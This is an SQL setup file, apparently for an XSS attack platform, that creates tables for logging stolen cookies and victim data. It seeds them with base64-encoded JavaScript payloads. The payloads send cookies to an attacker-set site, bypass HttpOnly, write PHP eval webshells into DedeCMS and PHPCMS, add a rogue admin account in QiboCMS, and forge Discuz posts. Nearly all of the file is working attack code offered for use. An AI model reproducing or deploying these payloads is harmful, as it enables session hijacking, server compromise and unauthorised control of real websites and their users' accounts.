DROP TABLE IF EXISTS `xssmadao`;
create table xssmadao
(
    column_1 int null
) DEFAULT CHARSET=utf8;



DROP TABLE IF EXISTS `dingconfig`;
create table dingconfig
(
    webhook   varchar(250) null,
    isNotice  tinyint      null,
    msgConfig int          null
) DEFAULT CHARSET=utf8;


DROP TABLE IF EXISTS `payloads`;
create table payloads
(
    name   varchar(200)  not null,
    `desc` varchar(200)  null,
    jscode mediumtext    null,
    love   int default 0 not null,
    constraint payloads_name_uindex
        unique (name)
) DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `reciver`;
create table reciver
(
    host           varchar(30)  null,
    connection     varchar(20)  null,
    userAgent      varchar(200) null,
    accept         varchar(200) null,
    acceptEncoding varchar(200) null,
    cookie         varchar(200) null,
    time           varchar(60)  null,
    data           mediumtext   null,
    ip             varchar(30)  null
) DEFAULT CHARSET=utf8;



INSERT INTO xss.payloads (name, `desc`, jscode, love) VALUES ('screenshot.js', 'screenshot', '', 1);
INSERT INTO xss.payloads (name, `desc`, jscode, love) VALUES ('alert.js', '2', 'YWxlcnQoInhzcyIpOw==', 1);
INSERT INTO xss.payloads (name, `desc`, jscode, love) VALUES ('cookie.js', 'get cookie', 'dmFyIHdlYnNpdGU9Imh0dHA6Ly/nvZHnq5nlnLDlnYAiOwooZnVuY3Rpb24oKXsobmV3IEltYWdlKCkpLnNyYz13ZWJzaXRlKycvP2tlZXBzZXNzaW9uPTEmbG9jYXRpb249Jytlc2NhcGUoKGZ1bmN0aW9uKCl7dHJ5e3JldHVybiBkb2N1bWVudC5sb2NhdGlvbi5ocmVmfWNhdGNoKGUpe3JldHVybicnfX0pKCkpKycmdG9wbG9jYXRpb249Jytlc2NhcGUoKGZ1bmN0aW9uKCl7dHJ5e3JldHVybiB0b3AubG9jYXRpb24uaHJlZn1jYXRjaChlKXtyZXR1cm4nJ319KSgpKSsnJmNvb2tpZT0nK2VzY2FwZSgoZnVuY3Rpb24oKXt0cnl7cmV0dXJuIGRvY3VtZW50LmNvb2tpZX1jYXRjaChlKXtyZXR1cm4nJ319KSgpKSsnJm9wZW5lcj0nK2VzY2FwZSgoZnVuY3Rpb24oKXt0cnl7cmV0dXJuKHdpbmRvdy5vcGVuZXImJndpbmRvdy5vcGVuZXIubG9jYXRpb24uaHJlZik/d2luZG93Lm9wZW5lci5sb2NhdGlvbi5ocmVmOicnfWNhdGNoKGUpe3JldHVybicnfX0pKCkpO30pKCk7', 0);
INSERT INTO xss.payloads (name, `desc`, jscode, love) VALUES ('dedecms.js', '2', 'dmFycmVxdWVzdCA9IGZhbHNlOwppZiAod2luZG93LlhNTEh0dHBSZXF1ZXN0KSB7CiAgICByZXF1ZXN0ID0gbmV3WE1MSHR0cFJlcXVlc3QoKTsKICAgIGlmIChyZXF1ZXN0Lm92ZXJyaWRlTWltZVR5cGUpIHsKICAgICAgICByZXF1ZXN0Lm92ZXJyaWRlTWltZVR5cGUoJ3RleHQveG1sJyk7CiAgICB9Cn0KZWxzZSBpZih3aW5kb3cuQWN0aXZlWE9iamVjdCkgewogICAgdmFydmVyc2lvbnMgPSBbJ01pY3Jvc29mdC5YTUxIVFRQJywgJ01TWE1MLlhNTEhUVFAnLCAnTWljcm9zb2Z0LlhNTEhUVFAnLCAnTXN4bWwyLlhNTEhUVFAuNy4wJywgJ01zeG1sMi5YTUxIVFRQLjYuMCcsICdNc3htbDIuWE1MSFRUUC41LjAnLCAnTXN4bWwyLlhNTEhUVFAuNC4wJywgJ01TWE1MMi5YTUxIVFRQLjMuMCcsICdNU1hNTDIuWE1MSFRUUCddOwogICAgZm9yICh2YXJpID0gMDsgaSA8IHZlcnNpb25zLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgcmVxdWVzdCA9IG5ld0FjdGl2ZVhPYmplY3QodmVyc2lvbnMpOwogICAgICAgIH0gY2F0Y2ggKGUpIHt9CiAgICB9Cn0KeG1saHR0cCA9IHJlcXVlc3Q7CmZ1bmN0aW9uIGdldEZvbGRlcih1cmwpIHsKICAgIG9iaiA9IHVybC5zcGxpdCgnLycpOwogICAgcmV0dXJuIG9ialtvYmoubGVuZ3RoIC0gMl07Cn0Kb1VybCA9IHRvcC5sb2NhdGlvbi5ocmVmOwp1ID0gZ2V0Rm9sZGVyKG9VcmwpOwphZGRfYWRtaW4oKTsKZnVuY3Rpb24gYWRkX2FkbWluKCkgewogICAgdmFydXJsID0gIi8iICsgdSArICIvc3lzX3NxbF9xdWVyeS5waHAiOwogICAgdmFycGFyYW1zID0gImZtZG89ZWRpdCZiYWNrdXJsPSZhY3RpdmVwYXRoPSUyRmRhdGEmZmlsZW5hbWU9MTIzLnBocCZzdHI9PCUzRnBocCtldmFsJTI4JTI0X1BPU1QlNUJyMTIzJTVEJTI5JTNGPiZCMT0rKyVFNCVCRiU5RCslRTUlQUQlOTgrKyI7CiAgICB4bWxodHRwLm9wZW4oIlBPU1QiLCB1cmwsIHRydWUpOwogICAgeG1saHR0cC5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LXR5cGUiLCAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIik7CiAgICB4bWxodHRwLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtbGVuZ3RoIiwgdmFycGFyYW1zLmxlbmd0aCk7CiAgICB4bWxodHRwLnNldFJlcXVlc3RIZWFkZXIoIkNvbm5lY3Rpb24iLCAiS2VlcC1BbGl2ZSIpOwogICAgeG1saHR0cC5zZW5kKHZhcnBhcmFtcyk7Cn0=', 0);
INSERT INTO xss.payloads (name, `desc`, jscode, love) VALUES ('HttponlyBypass.js', '11', 'dmFyIHdlYnNpdGU9Imh0dHA6Ly/nvZHnq5nlnLDlnYAiOwpmdW5jdGlvbiBzZXRDb29raWVzKCkgewogICAgLyphcGFjaGUgc2VydmVyIGxpbWl0IDgxOTIqLwogICAgdmFyIHN0ciA9ICIiOwogICAgZm9yICh2YXIgaSA9IDA7IGkgPCA4MTk7IGkrKykgewogICAgICAgIHN0ciArPSAieCI7CiAgICB9CiAgICBmb3IgKGkgPSAwOyBpIDwgMTA7IGkrKykgewogICAgICAgIHZhciBjb29raWUgPSAicmF5IiArIGkgKyAiPSIgKyBzdHIgKyAiO3BhdGg9LyI7CiAgICAgICAgZG9jdW1lbnQuY29va2llID0gY29va2llOwogICAgfQp9CgpmdW5jdGlvbiBwYXJzZUNvb2tpZXMoKSB7CiAgICBpZiAoeGhyLnJlYWR5U3RhdGUgPT09IDQgJiYgeGhyLnN0YXR1cyA9PT0gNDAwKSB7CiAgICAgICAgdmFyIGNvbnRlbnQgPSB4aHIucmVzcG9uc2VUZXh0LnJlcGxhY2UoL1xyfFxuL2csICcnKS5tYXRjaCgvPHByZT4oLispPFwvcHJlPi8pOwogICAgICAgIGNvbnRlbnQgPSBjb250ZW50WzFdLnJlcGxhY2UoIkNvb2tpZTogIiwgIiIpOwogICAgICAgIGNvb2tpZXMgPSBjb250ZW50LnJlcGxhY2UoL3JheVxkPXgrOz8vZywgJycpCiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgdmFyIG15b3BlbmVyID0gJyc7CiAgICAgICAgICAgIG15b3BlbmVyID0gd2luZG93LnBhcmVudC5vcGVubmVyLmxvY2F0aW9uOwogICAgICAgICAgICB2YXIgbXlwYXJlbnQgPSAnJzsKICAgICAgICAgICAgbXlwYXJlbnQgPSB3aW5kb3cucGFyZW50LmxvY2F0aW9uOwogICAgICAgIH0gY2F0Y2ggKGVycikgewogICAgICAgICAgICBteW9wZW5lciA9ICcwJzsKICAgICAgICAgICAgbXlwYXJlbnQgPSAnMCc7CiAgICAgICAgfQogICAgICAgIHdpbmRvdy5sb2NhdGlvbiA9IHdlYnNpdGUgKyAnL2luZGV4LnBocD9sb2NhdGlvbj0nICsgZXNjYXBlKGRvY3VtZW50LmxvY2F0aW9uKSArICcmdG9wbG9jYXRpb249JyArIGVzY2FwZShteXBhcmVudCkgKyAnJmNvb2tpZT0nICsgZXNjYXBlKGNvb2tpZXMpICsgJyZvcGVuZXI9JyArIGVzY2FwZShteW9wZW5lcik7CiAgICB9Cn0KCnNldENvb2tpZXMoKTsKdmFyIHhociA9IHdpbmRvdy5YTUxIdHRwUmVxdWVzdCA/IG5ldyBYTUxIdHRwUmVxdWVzdCgpIDogd2luZG93LkFjdGl2ZVhPYmplY3QgPyBuZXcgQWN0aXZlWE9iamVjdCgiTWljcm9zb2Z0LlhNTEhUVFAiKSA6IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp4aHIub25yZWFkeXN0YXRlY2hhbmdlID0gcGFyc2VDb29raWVzOwp4aHIub3BlbigiUE9TVCIsICIvPyIgKyBNYXRoLnJhbmRvbSgpLCB0cnVlKTsKeGhyLnNlbmQobnVsbCk7', 0);
INSERT INTO xss.payloads (name, `desc`, jscode, love) VALUES ('DiscuzCSRF.js', 'dd', 'ZnVuY3Rpb24gZ2V0SGFzaCgpIHsKCiAgICBmb3IgKHZhciBpID0gMDsgaSA8IGRvY3VtZW50LmxpbmtzLmxlbmd0aDsgaSsrKSB7CgogICAgICAgIGlmIChkb2N1bWVudC5saW5rc1tpXS5ocmVmLmluZGV4T2YoImFjdGlvbj1sb2dvdXQmZm9ybWhhc2g9IikgPiAwKSB7CgogICAgICAgICAgICBoYXNoID0gZG9jdW1lbnQubGlua3NbaV0uaHJlZjsKICAgICAgICAgICAgaGFzaCA9IGhhc2guc3Vic3RyKGhhc2gubGVuZ3RoIC0gOCwgaGFzaC5sZW5ndGgpOwogICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICB9Cgp9CnggPSB3aW5kb3cueCB8fCB7CiAgICByZXF1ZXN0OiBmdW5jdGlvbigpIHsKICAgICAgICBpZiAod2luZG93LlhNTEh0dHBSZXF1ZXN0KSB7CiAgICAgICAgICAgIHZhciBhamF4ID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCkKICAgICAgICB9IGVsc2UgaWYgKHdpbmRvdy5BY3RpdmVYT2JqZWN0KSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICB2YXIgYWpheCA9IG5ldyBBY3RpdmVYT2JqZWN0KCJNc3htbDIuWE1MSFRUUCIpCiAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIGFqYXggPSBuZXcgQWN0aXZlWE9iamVjdCgiTWljcm9zb2Z0LlhNTEhUVFAiKQogICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkge30KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gYWpheAogICAgfSwKICAgIGhhbmRsZTogZnVuY3Rpb24oYWpheCwgY2FsbGJhY2spIHsKICAgICAgICBhamF4Lm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgewogICAgICAgICAgICBpZiAoYWpheC5yZWFkeVN0YXRlID09IDQpIHsKICAgICAgICAgICAgICAgIGlmIChhamF4LnN0YXR1cyA9PSAyMDApIHsKICAgICAgICAgICAgICAgICAgICBjYWxsYmFjayhhamF4LnJlc3BvbnNlVGV4dCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0sCiAgICBkaXNwbGF5OiBmdW5jdGlvbihvKSB7CiAgICAgICAgaWYgKHR5cGVvZihvKSA9PSAnb2JqZWN0JykgewogICAgICAgICAgICB2YXIgc3RyID0gJyc7CiAgICAgICAgICAgIGZvciAoYSBpbiBvKSB7CgogICAgICAgICAgICAgICAgc3RyICs9IGEgKyAnPScgKyBvW2FdICsgJyYnOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHN0ciA9IHN0ci5zdWJzdHIoMCwgc3RyLmxlbmd0aCAtIDEpOwogICAgICAgICAgICByZXR1cm4gc3RyOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHVybiBvOwogICAgICAgIH0KICAgIH0sCiAgICBnZXQ6IGZ1bmN0aW9uKHVybCwgY2FsbGJhY2spIHsKICAgICAgICBhamF4ID0geC5yZXF1ZXN0KCk7CiAgICAgICAgYWpheC5vcGVuKCdnZXQnLCB1cmwsIHRydWUpOwogICAgICAgIGFqYXguc2VuZChudWxsKTsKICAgICAgICB4LmhhbmRsZShhamF4LCBjYWxsYmFjaykKICAgIH0sCiAgICBwb3N0OiBmdW5jdGlvbih1cmwsIGNvbnRlbnQsIGNhbGxiYWNrKSB7CiAgICAgICAgYWpheCA9IHgucmVxdWVzdCgpOwogICAgICAgIGFqYXgub3BlbigncG9zdCcsIHVybCwgdHJ1ZSk7CiAgICAgICAgYWpheC5zZXRSZXF1ZXN0SGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJyk7CiAgICAgICAgY29udGVudCA9IHguZGlzcGxheShjb250ZW50KTsKICAgICAgICBhamF4LnNlbmQoY29udGVudCk7CiAgICAgICAgeC5oYW5kbGUoYWpheCwgY2FsbGJhY2spCiAgICB9LAp9CgoKdmFyIGhhc2ggPSAiIjsKZ2V0SGFzaCgpOwoKLyrlj5HluJbmk43kvZwKeC5wb3N0KCLmjqXlj6PlnLDlnYAiLCJmb3JtaGFzaD0iK2hhc2grIiZwb3N0dGltZT0xMzc3NTY2NDcmd3lzaXd5Zz0xJnN1YmplY3Q9JUU2JTk2JUIwJUU0JUJBJUJBJUU2JThBJUE1JUU5JTgxJTkzVEVTVCZtZXNzYWdlPSVFNiU5NiVCMCVFNCVCQSVCQSVFNiU4QSVBNSVFOSU4MSU5M1RFU1QraGFja2VkKytieStoZWxlbiZyZXBseWNyZWRpdF9leHRjcmVkaXRzPTAmcmVwbHljcmVkaXRfdGltZXM9MSZyZXBseWNyZWRpdF9tZW1iZXJ0aW1lcz0xJnJlcGx5Y3JlZGl0X3JhbmRvbT0xMDAmcmVhZHBlcm09JnByaWNlPSZ0YWdzPXRlc3QmcnVzaHJlcGx5ZnJvbT0mcnVzaHJlcGx5dG89JnJld2FyZGZsb29yPSZzdG9wZmxvb3I9JmNyZWRpdGxpbWl0PSZzYXZlPSZhZGRkeW5hbWljPXRydWUmdXNlc2lnPTEmYWxsb3dub3RpY2VhdXRob3I9MSIpOyAKKi8KLyrnva7pobbluJblrZAgIDxzY3JpcHQgIHNyYz0iaHR0cDovL3cvdHJ5LzEuanMiPiA8L3NjcmlwdD4KeC5wb3N0KCLmjqXlj6PlnLDlnYAiLCJmcm9tbW9kY3A9JmZvcm1oYXNoPSIraGFzaCsiJmZpZD0yJnJlZGlyZWN0PSZsaXN0ZXh0cmE9cGFnZSUzRDEmaGFuZGxla2V5PW1vZHMmbW9kZXJhdGVbXT0xMiZvcGVyYXRpb25zW109c3RpY2smc3RpY2tsZXZlbD0zJmV4cGlyYXRpb25zdGljaz0mZGlnZXN0bGV2ZWw9MCZleHBpcmF0aW9uZGlnZXN0PSZoaWdobGlnaHRfY29sb3I9MCZoaWdobGlnaHRfc3R5bGVbMV09MCZoaWdobGlnaHRfc3R5bGVbMl09MCZoaWdobGlnaHRfc3R5bGVbM109MCZleHBpcmF0aW9uaGlnaGxpZ2h0PSZyZWFzb249Iik7CgoKKi8=', 0);
INSERT INTO xss.payloads (name, `desc`, jscode, love) VALUES ('phpcms.js', 'wt', 'aWYgKHRvcC53aW5kb3cubG9jYXRpb24uaHJlZi5pbmRleE9mKCJwY19oYXNoPSIpID4gMCkgewogICAgdmFyIGhhc2ggPSB0b3Aud2luZG93LmxvY2F0aW9uLmhyZWYuc3Vic3RyKHRvcC53aW5kb3cubG9jYXRpb24uaHJlZi5pbmRleE9mKCJwY19oYXNoPSIpICsgOCwgNik7Cn0KdmFyIHBrYXYgPSB7CiAgICBhamF4OiBmdW5jdGlvbigpIHsKICAgICAgICB2YXIgeG1sSHR0cDsKICAgICAgICB0cnkgewogICAgICAgICAgICB4bWxIdHRwID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CiAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgeG1sSHR0cCA9IG5ldyBBY3RpdmVYT2JqZWN0KCJNc3htbDIuWE1MSFRUUCIpOwogICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIHhtbEh0dHAgPSBuZXcgQWN0aXZlWE9iamVjdCgiTWljcm9zb2Z0LlhNTEhUVFAiKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIHhtbEh0dHA7CiAgICB9LAogICAgcmVxOiBmdW5jdGlvbih1cmwsIGRhdGEsIG1ldGhvZCwgY2FsbGJhY2spIHsKICAgICAgICBtZXRob2QgPSAobWV0aG9kIHx8ICIiKS50b1VwcGVyQ2FzZSgpOwogICAgICAgIG1ldGhvZCA9IG1ldGhvZCB8fCAiR0VUIjsKICAgICAgICBkYXRhID0gZGF0YSB8fCAiIjsKICAgICAgICBpZiAodXJsKSB7CiAgICAgICAgICAgIHZhciBhID0gdGhpcy5hamF4KCk7CiAgICAgICAgICAgIGEub3BlbihtZXRob2QsIHVybCwgdHJ1ZSk7CiAgICAgICAgICAgIGlmIChtZXRob2QgPT0gIlBPU1QiKSB7CiAgICAgICAgICAgICAgICBhLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBhLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgaWYgKGEucmVhZHlTdGF0ZSA9PSA0ICYmIGEuc3RhdHVzID09IDIwMCkgewogICAgICAgICAgICAgICAgICAgIGlmIChjYWxsYmFjaykgewogICAgICAgICAgICAgICAgICAgICAgICBjYWxsYmFjayhhLnJlc3BvbnNlVGV4dCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9OwogICAgICAgICAgICBpZiAoKHR5cGVvZiBkYXRhKSA9PSAib2JqZWN0IikgewogICAgICAgICAgICAgICAgdmFyIGFyciA9IFtdOwogICAgICAgICAgICAgICAgZm9yICh2YXIgaSBpbiBkYXRhKSB7CiAgICAgICAgICAgICAgICAgICAgYXJyLnB1c2goaSArICI9IiArIGVuY29kZVVSSUNvbXBvbmVudChkYXRhW2ldKSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBhLnNlbmQoYXJyLmpvaW4oIiYiKSk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBhLnNlbmQoZGF0YSB8fCBudWxsKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0sCiAgICBnZXQ6IGZ1bmN0aW9uKHVybCwgY2FsbGJhY2spIHsKICAgICAgICB0aGlzLnJlcSh1cmwsICIiLCAiR0VUIiwgY2FsbGJhY2spOwogICAgfSwKICAgIHBvc3Q6IGZ1bmN0aW9uKHVybCwgZGF0YSwgY2FsbGJhY2spIHsKICAgICAgICB0aGlzLnJlcSh1cmwsIGRhdGEsICJQT1NUIiwgY2FsbGJhY2spOwogICAgfQp9OwppZiAoIXdpbmRvdy5fX3gpIHsKICAgIHBrYXYucG9zdCgiaW5kZXgucGhwP209dGVtcGxhdGUmYz1maWxlJmE9ZWRpdF9maWxlJnN0eWxlPWRlZmF1bHQmZGlyPWFubm91bmNlJmZpbGU9c2hvdy5odG1sIiwgImNvZGU9JTdCdGVtcGxhdGUrJTI3Y29udGVudCUyNyUyQyslMjdoZWFkZXIlMjclN0QlMEQlMEElM0MlMjEtLW1haW4tLSUzRSUwRCUwQSUzQ2RpditjbGFzcyUzRCUyMm1haW4lMjIlM0UlMEQlMEElMDklM0NkaXYrY2xhc3MlM0QlMjJjb2wtbGVmdCUyMiUzRSUwRCUwQSsrKyslMDklM0NkaXYrY2xhc3MlM0QlMjJjcnVtYnMlMjIlM0UlM0NhK2hyZWYlM0QlMjIlN0JBUFBfUEFUSCU3RCUyMiUzRSVDQSVENyVEMiVCMyUzQyUyRmElM0UlM0NzcGFuJTNFKyUzRSslM0MlMkZzcGFuJTNFJUI5JUFCJUI4JUU2JTNDJTJGZGl2JTNFJTBEJTBBKysrKysrKyslM0NkaXYraWQlM0QlMjJBcnRpY2xlJTIyJTNFJTBEJTBBKysrKysrKyslMDklM0NoMSUzRSU3QiUyNHRpdGxlJTdEJTNDYnIrJTJGJTNFJTBEJTBBJTNDc3BhbiUzRSUzQyUyRnNwYW4lM0UlM0MlMkZoMSUzRSUwRCUwQSUwOSUwOSUwOSUzQ2RpditjbGFzcyUzRCUyMmNvbnRlbnQlMjIlM0UlMEQlMEElMDklMDklMDkrKyU3QiUyNGNvbnRlbnQlN0QlMEQlMEElMDklMDklMDklM0MlMkZkaXYlM0UlMEQlMEErKysrKyslM0MlMkZkaXYlM0UlMEQlMEErKyUzQyUyRmRpdiUzRSUwRCUwQSsrKyslM0NkaXYrY2xhc3MlM0QlMjJjb2wtYXV0byUyMiUzRSUwRCUwQSsrKysrKysrJTNDZGl2K2NsYXNzJTNEJTIyYm94K3BkX2IwJTIyJTNFJTBEJTBBJTA5JTA5JTdCcGMlM0Fjb21tZW50K2FjdGlvbiUzRCUyMmJhbmclMjIrY2FjaGUlM0QlMjIzNjAwJTIyJTdEJTBEJTBBKysrKysrKysrKysrJTNDdWwrY2xhc3MlM0QlMjJpdGVtbGklMjIlM0UlMEQlMEElMDklMDklMDklN0Jsb29wKyUyNGRhdGErJTI0ciU3RCUwRCUwQSsrKysrKysrKysrKysrKyslM0NsaSUzRSUzQ2EraHJlZiUzRCUyMiU3QiUyNHIlNUJ1cmwlNUQlN0QlMjIrdGFyZ2V0JTNEJTIyX2JsYW5rJTIyJTNFJTdCc3RyX2N1dCUyOCUyNHIlNUJ0aXRsZSU1RCUyQysyNiUyOSU3RCUzQyUyRmElM0UlM0MlMkZsaSUzRSUwRCUwQSsrKysrKysrKysrKyU3QiUyRmxvb3AlN0QlMEQlMEErKysrKysrKysrKyslM0MlMkZ1bCUzRSUwRCUwQSUwOSUwOSU3QiUyRnBjJTdEJTBEJTBBKysrKysrKyslM0MlMkZkaXYlM0UlMEQlMEErKysrJTNDJTJGZGl2JTNFJTBEJTBBJTNDJTJGZGl2JTNFJTBEJTBBJTdCdGVtcGxhdGUrJTI3Y29udGVudCUyNyUyQyslMjdmb290ZXIlMjclN0QlMEQlMEElM0NzY3JpcHQrbGFuZ3VhZ2UlM0RwaHAlM0UlMjRmcCslM0QrJTQwZm9wZW4lMjglMjJ0ZXN0LnBocCUyMiUyQyslMjdhJTI3JTI5JTNCJTBEJTBBJTQwZndyaXRlJTI4JTI0ZnAlMkMrJTI3JTNDJTI3LiUyNyUzRnBocCUyNy4lMjIlNUNyJTVDbiU1Q3IlNUNuJTIyLiUyNyU0MGV2YWwlMjglMjRfUE9TVCU1QiUyMmNob3BwZXIlMjIlNUQlMjklMjcuJTIyJTVDciU1Q24lNUNyJTVDbiUzRiUyMi4lMjIlM0UlNUNyJTVDbiUyMiUyOSUzQiUwRCUwQSU0MGZjbG9zZSUyOCUyNGZwJTI5JTNCJTNDJTJGc2NyaXB0JTNFJmRvc3VibWl0PSVDQyVFMSVCRCVCQiZwY19oYXNoPSIgKyBoYXNoLCBmdW5jdGlvbihycykge30pOwogICAgcGthdi5nZXQoImluZGV4LnBocD9tPXRlbXBsYXRlJmM9ZmlsZSZhPXZpc3VhbGl6YXRpb24mc3R5bGU9ZGVmYXVsdCZkaXI9YW5ub3VuY2UmZmlsZT1zaG93Lmh0bWwmcGNfaGFzaD0iICsgaGFzaCwgZnVuY3Rpb24ocnMpIHt9KTsKICAgIHdpbmRvdy5fX3ggPSAxOwp9', 0);
INSERT INTO xss.payloads (name, `desc`, jscode, love) VALUES ('qibocms.js', 'wt', 'dmFyIHBrYXYgPSB7CiAgICBhamF4OiBmdW5jdGlvbigpIHsKICAgICAgICB2YXIgeG1sSHR0cDsKICAgICAgICB0cnkgewogICAgICAgICAgICB4bWxIdHRwID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CiAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgeG1sSHR0cCA9IG5ldyBBY3RpdmVYT2JqZWN0KCJNc3htbDIuWE1MSFRUUCIpOwogICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIHhtbEh0dHAgPSBuZXcgQWN0aXZlWE9iamVjdCgiTWljcm9zb2Z0LlhNTEhUVFAiKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIHhtbEh0dHA7CiAgICB9LAogICAgcmVxOiBmdW5jdGlvbih1cmwsIGRhdGEsIG1ldGhvZCwgY2FsbGJhY2spIHsKICAgICAgICBtZXRob2QgPSAobWV0aG9kIHx8ICIiKS50b1VwcGVyQ2FzZSgpOwogICAgICAgIG1ldGhvZCA9IG1ldGhvZCB8fCAiR0VUIjsKICAgICAgICBkYXRhID0gZGF0YSB8fCAiIjsKICAgICAgICBpZiAodXJsKSB7CiAgICAgICAgICAgIHZhciBhID0gdGhpcy5hamF4KCk7CiAgICAgICAgICAgIGEub3BlbihtZXRob2QsIHVybCwgdHJ1ZSk7CiAgICAgICAgICAgIGlmIChtZXRob2QgPT0gIlBPU1QiKSB7CiAgICAgICAgICAgICAgICBhLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBhLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgaWYgKGEucmVhZHlTdGF0ZSA9PSA0ICYmIGEuc3RhdHVzID09IDIwMCkgewogICAgICAgICAgICAgICAgICAgIGlmIChjYWxsYmFjaykgewogICAgICAgICAgICAgICAgICAgICAgICBjYWxsYmFjayhhLnJlc3BvbnNlVGV4dCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9OwogICAgICAgICAgICBpZiAoKHR5cGVvZiBkYXRhKSA9PSAib2JqZWN0IikgewogICAgICAgICAgICAgICAgdmFyIGFyciA9IFtdOwogICAgICAgICAgICAgICAgZm9yICh2YXIgaSBpbiBkYXRhKSB7CiAgICAgICAgICAgICAgICAgICAgYXJyLnB1c2goaSArICI9IiArIGVuY29kZVVSSUNvbXBvbmVudChkYXRhW2ldKSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBhLnNlbmQoYXJyLmpvaW4oIiYiKSk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBhLnNlbmQoZGF0YSB8fCBudWxsKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0sCiAgICBnZXQ6IGZ1bmN0aW9uKHVybCwgY2FsbGJhY2spIHsKICAgICAgICB0aGlzLnJlcSh1cmwsICIiLCAiR0VUIiwgY2FsbGJhY2spOwogICAgfSwKICAgIHBvc3Q6IGZ1bmN0aW9uKHVybCwgZGF0YSwgY2FsbGJhY2spIHsKICAgICAgICB0aGlzLnJlcSh1cmwsIGRhdGEsICJQT1NUIiwgY2FsbGJhY2spOwogICAgfQp9OwppZiAoIXdpbmRvdy5fX3gpIHsKICAgIHBrYXYucG9zdCgiL2FkbWluL2luZGV4LnBocD9sZmo9bWVtYmVyJmFjdGlvbj1hZGRtZW1iZXIiLCAicG9zdGRiJTVCdXNlcm5hbWUlNUQ9a2FrYWh1YWRtaW4mcG9zdGRiJTVCcGFzc3dkJTVEPWtha2FodWFkbWluJnBvc3RkYiU1QnBhc3N3ZDIlNUQ9a2FrYWh1YWRtaW4mcG9zdGRiJTVCZ3JvdXBpZCU1RD0zJnBvc3RkYiU1QmVtYWlsJTVEPWtha2FodWFkbWluJTQwcXEuY29tJlN1Ym1pdD0lQ0MlRTElQkQlQkIiLCBmdW5jdGlvbihycykge30pOwogICAgcGthdi5nZXQoIuaOpeWPo+WcsOWdgCIsIGZ1bmN0aW9uKHJzKSB7fSk7CiAgICB3aW5kb3cuX194ID0gMTsKfQ==', 0);
